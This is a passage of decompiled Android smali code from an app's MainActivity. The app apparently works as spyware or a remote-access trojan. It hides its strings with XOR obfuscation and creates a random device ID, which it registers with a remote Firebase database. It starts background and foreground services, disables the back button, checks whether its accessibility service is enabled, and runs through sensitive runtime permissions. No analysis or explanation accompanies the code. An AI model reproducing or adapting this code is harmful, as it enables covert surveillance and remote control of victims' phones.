    const/16 v2, 0x8

    .line 531
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v3, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 532
    new-instance v3, Ljava/util/Random;

    invoke-direct {v3}, Ljava/util/Random;-><init>()V

    .line 533
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4, v2}, Ljava/lang/StringBuilder;-><init>(I)V

    .line 534
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v0

    add-int/lit8 v0, v0, -0x1

    invoke-virtual {v3, v0}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    invoke-virtual {v1, v0}, Ljava/lang/String;->charAt(I)C

    move-result v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 536
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->length()I

    move-result v0

    :goto_0
    if-lt v0, v2, :cond_0

    .line 543
    :try_start_0
    new-instance v0, Ljava/io/FileOutputStream;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "eiEvSRYhLDI="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x1

    invoke-direct {v0, v1, v2}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;Z)V

    .line 544
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/FileOutputStream;->write([B)V

    .line 545
    invoke-virtual {v0}, Ljava/io/FileOutputStream;->close()V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_3
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2

    .line 561
    :goto_1
    :try_start_1
    new-instance v0, Ljava/io/FileOutputStream;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "eiQnQ105ejJVTA=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x1

    invoke-direct {v0, v1, v2}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;Z)V

    .line 562
    iget-object v1, p0, Lsigma/male/MainActivity;->sp:Landroid/content/SharedPreferences;

    const-string v2, "JTUoSFQ="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, ""

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/FileOutputStream;->write([B)V

    .line 563
    invoke-virtual {v0}, Ljava/io/FileOutputStream;->close()V
    :try_end_1
    .catch Ljava/io/FileNotFoundException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_0

    .line 576
    :goto_2
    iget-object v0, p0, Lsigma/male/MainActivity;->sp:Landroid/content/SharedPreferences;

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "ID0i"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 577
    iget-object v0, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    invoke-virtual {v0}, Ljava/util/HashMap;->clear()V

    .line 578
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    iput-object v0, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    .line 579
    iget-object v0, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    const-string v1, "NjkiQw=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "JiElTl0mJw=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 580
    iget-object v0, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    const-string v1, "NjkiWw=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "JiElTl0mJw=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 581
    iget-object v0, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    const-string v1, "NjkiW1kn"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "JiElTl0mJw=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 582
    iget-object v0, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    const-string v1, "JzoiQA=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "JiElTl0mJw=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 583
    iget-object v0, p0, Lsigma/male/MainActivity;->_firebase:Lcom/google/firebase/database/FirebaseDatabase;

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "ejcpQFwmeyVCVTEn"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lsigma/male/MainActivity;->sp:Landroid/content/SharedPreferences;

    const-string v3, "ID0i"

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/FirebaseDatabase;->getReference(Ljava/lang/String;)Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    const-string v1, "NjsrSUsm"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/DatabaseReference;->child(Ljava/lang/String;)Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    .line 584
    iget-object v1, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/DatabaseReference;->setValue(Ljava/lang/Object;)Lcom/google/android/gms/tasks/Task;

    .line 586
    iget-object v0, p0, Lsigma/male/MainActivity;->_firebase:Lcom/google/firebase/database/FirebaseDatabase;

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "ejcpQFwmeyVCVTEn"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lsigma/male/MainActivity;->sp:Landroid/content/SharedPreferences;

    const-string v3, "ID0i"

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "JTwv"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/FirebaseDatabase;->getReference(Ljava/lang/String;)Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    const-string v1, "NjsrSUsm"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/DatabaseReference;->child(Ljava/lang/String;)Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    .line 587
    iget-object v1, p0, Lsigma/male/MainActivity;->responsetxt:Ljava/util/HashMap;

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/DatabaseReference;->setValue(Ljava/lang/Object;)Lcom/google/android/gms/tasks/Task;

    .line 588
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lsigma/male/servicess;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lsigma/male/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 590
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lsigma/male/ForegroundService;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lsigma/male/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 591
    invoke-virtual {p0}, Lsigma/male/MainActivity;->_pihtest()V

    .line 592
    const-string v0, "JiElTl0mJw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v0, "JiElTl0mJw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v0, "JiElTl0mJw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v0, "JiElTl0mJw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v0, "JiElTl0mJw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/MainActivity;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 593
    return-void

    .line 537
    :cond_0
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v5

    invoke-virtual {v3, v5}, Ljava/util/Random;->nextInt(I)I

    move-result v5

    invoke-virtual {v1, v5}, Ljava/lang/String;->charAt(I)C

    move-result v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 536
    add-int/lit8 v0, v0, 0x1

    goto/16 :goto_0

    :catch_0
    move-exception v0

    goto/16 :goto_2

    .line 566
    :catch_1
    move-exception v0

    goto/16 :goto_2

    :catch_2
    move-exception v0

    goto/16 :goto_1

    .line 548
    :catch_3
    move-exception v0

    goto/16 :goto_1
.end method

.method public _snotiow(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 11

    .prologue
    .line 840
    invoke-virtual {p0}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    .line 842
    const/16 v0, 0x12

    new-array v2, v0, [I

    fill-array-data v2, :array_0

    .line 844
    const-string v0, "OzsyRF48NydZUTo6"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    .line 846
    new-instance v3, Landroid/content/Intent;

    const-class v4, Lsigma/male/MainActivity;

    invoke-direct {v3, p0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 847
    const/high16 v4, 0x24000000

    invoke-virtual {v3, v4}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 848
    const-string v4, "Jjc0SF07"

    invoke-static {v4}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4, p3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 849
    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-static {p0, v4, v3, v5}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    .line 852
    const/4 v5, 0x2

    .line 853
    const-string v6, "NDoiX1c8MChCTDw="

    invoke-static {v6}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 854
    const-string v7, "FDoiX1c8MGZjVyE9IERbNCAvQlY="

    invoke-static {v7}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 855
    const/4 v8, 0x4

    .line 857
    sget v9, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v10, 0x1a

    if-lt v9, v10, :cond_0

    .line 858
    new-instance v9, Landroid/app/NotificationChannel;

    invoke-direct {v9, v6, v7, v8}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 860
    invoke-virtual {v0, v9}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 863
    :cond_0
    new-instance v7, Landroidx/core/app/NotificationCompat$Builder;

    invoke-direct {v7, v1, v6}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 864
    invoke-static {p4}, Ljava/lang/Double;->parseDouble(Ljava/lang/String;)D

    move-result-wide v8

    double-to-int v6, v8

    aget v2, v2, v6

    invoke-virtual {v7, v2}, Landroidx/core/app/NotificationCompat$Builder;->setSmallIcon(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v2

    .line 865
    invoke-virtual {v2, p1}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v2

    .line 866
    invoke-virtual {v2, p2}, Landroidx/core/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v2

    .line 867
    const/4 v6, 0x1

    invoke-virtual {v2, v6}, Landroidx/core/app/NotificationCompat$Builder;->setAutoCancel(Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v2

    .line 868
    const/4 v6, 0x0

    invoke-virtual {v2, v6}, Landroidx/core/app/NotificationCompat$Builder;->setOngoing(Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v2

    .line 869
    invoke-virtual {v2, v4}, Landroidx/core/app/NotificationCompat$Builder;->setContentIntent(Landroid/app/PendingIntent;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v2

    .line 870
    invoke-static {v1}, Landroid/app/TaskStackBuilder;->create(Landroid/content/Context;)Landroid/app/TaskStackBuilder;

    move-result-object v1

    .line 871
    invoke-virtual {v1, v3}, Landroid/app/TaskStackBuilder;->addNextIntent(Landroid/content/Intent;)Landroid/app/TaskStackBuilder;

    .line 873
    const/4 v3, 0x0

    .line 874
    const/high16 v4, 0x8000000

    .line 872
    invoke-virtual {v1, v3, v4}, Landroid/app/TaskStackBuilder;->getPendingIntent(II)Landroid/app/PendingIntent;

    move-result-object v1

    .line 876
    invoke-virtual {v2, v1}, Landroidx/core/app/NotificationCompat$Builder;->setContentIntent(Landroid/app/PendingIntent;)Landroidx/core/app/NotificationCompat$Builder;

    .line 878
    invoke-virtual {v2}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object v1

    invoke-virtual {v0, v5, v1}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    .line 880
    return-void

    .line 842
    nop

    :array_0
    .array-data 4
        0x7f070080
        0x7f070081
        0x7f070082
        0x7f070083
        0x7f070084
        0x7f070090
        0x7f070091
        0x7f0700a4
        0x7f0700a5
        0x7f0700b1
        0x7f0700be
        0x7f0700bf
        0x7f0700c0
        0x7f0700c1
        0x7f0700c5
        0x7f0700c6
        0x7f0700ca
        0x7f0700cb
    .end array-data
.end method

.method public getCheckedItemPositionsToArray(Landroid/widget/ListView;)Ljava/util/ArrayList;
    .locals 6
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/widget/ListView;",
            ")",
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/Double;",
            ">;"
        }
    .end annotation

    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 988
    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    .line 989
    invoke-virtual {p1}, Landroid/widget/ListView;->getCheckedItemPositions()Landroid/util/SparseBooleanArray;

    move-result-object v2

    .line 990
    const/4 v0, 0x0

    :goto_0
    invoke-virtual {v2}, Landroid/util/SparseBooleanArray;->size()I

    move-result v3

    if-lt v0, v3, :cond_0

    .line 994
    return-object v1

    .line 991
    :cond_0
    invoke-virtual {v2, v0}, Landroid/util/SparseBooleanArray;->valueAt(I)Z

    move-result v3

    if-eqz v3, :cond_1

    .line 992
    invoke-virtual {v2, v0}, Landroid/util/SparseBooleanArray;->keyAt(I)I

    move-result v3

    int-to-double v4, v3

    invoke-static {v4, v5}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 990
    :cond_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method public getDip(I)F
    .locals 3
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 999
    const/4 v0, 0x1

    int-to-float v1, p1

    invoke-virtual {p0}, Lsigma/male/MainActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    invoke-virtual {v2}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v2

    invoke-static {v0, v1, v2}, Landroid/util/TypedValue;->applyDimension(IFLandroid/util/DisplayMetrics;)F

    move-result v0

    return v0
.end method

.method public getDisplayHeightPixels()I
    .locals 1
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 1009
    invoke-virtual {p0}, Lsigma/male/MainActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v0

    iget v0, v0, Landroid/util/DisplayMetrics;->heightPixels:I

    return v0
.end method

.method public getDisplayWidthPixels()I
    .locals 1
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 1004
    invoke-virtual {p0}, Lsigma/male/MainActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v0

    iget v0, v0, Landroid/util/DisplayMetrics;->widthPixels:I

    return v0
.end method

.method public getLocationX(Landroid/view/View;)I
    .locals 2
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 968
    const/4 v0, 0x2

    new-array v0, v0, [I

    .line 969
    invoke-virtual {p1, v0}, Landroid/view/View;->getLocationInWindow([I)V

    .line 970
    const/4 v1, 0x0

    aget v0, v0, v1

    return v0
.end method

.method public getLocationY(Landroid/view/View;)I
    .locals 2
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 975
    const/4 v0, 0x2

    new-array v0, v0, [I

    .line 976
    invoke-virtual {p1, v0}, Landroid/view/View;->getLocationInWindow([I)V

    .line 977
    const/4 v1, 0x1

    aget v0, v0, v1

    return v0
.end method

.method public getRandom(II)I
    .locals 2
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 982
    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    .line 983
    sub-int v1, p2, p1

    add-int/lit8 v1, v1, 0x1

    invoke-virtual {v0, v1}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    add-int/2addr v0, p1

    return v0
.end method

.method public isAccessServiceEnabled(Landroid/content/Context;Ljava/lang/Class;)Z
    .locals 3

    .prologue
    .line 628
    invoke-virtual {p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "MDonT1QwMBlMWzYxNV5RNz0qREwsCzVISiM9JUhL"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 630
    if-eqz v0, :cond_0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "eg=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method public onBackPressed()V
    .locals 0

    .prologue
    .line 519
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    .prologue
    const/4 v1, -0x1

    .line 151
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 152
    const v0, 0x7f0b002f

    invoke-virtual {p0, v0}, Lsigma/male/MainActivity;->setContentView(I)V

    .line 153
    invoke-direct {p0, p1}, Lsigma/male/MainActivity;->initialize(Landroid/os/Bundle;)V

    .line 154
    invoke-static {p0}, Lcom/google/firebase/FirebaseApp;->initializeApp(Landroid/content/Context;)Lcom/google/firebase/FirebaseApp;

    .line 156
    const-string v0, "NDoiX1c8MGhdXSc5L15LPDsoA28HHRJoZxYbCHl5FgAV"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eq v0, v1, :cond_0

    .line 157
    const-string v0, "NDoiX1c8MGhdXSc5L15LPDsoA2oQFQJyaxgH"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eq v0, v1, :cond_0

    .line 158
    const-string v0, "NDoiX1c8MGhdXSc5L15LPDsoA2oQFQJyexoaEmx7AQc="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eq v0, v1, :cond_0

    .line 159
    const-string v0, "NDoiX1c8MGhdXSc5L15LPDsoA2sQGgJyaxgH"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eq v0, v1, :cond_0

    .line 160
    const-string v0, "NDoiX1c8MGhdXSc5L15LPDsoA2oQFQJyexQYCnJ0GhM="

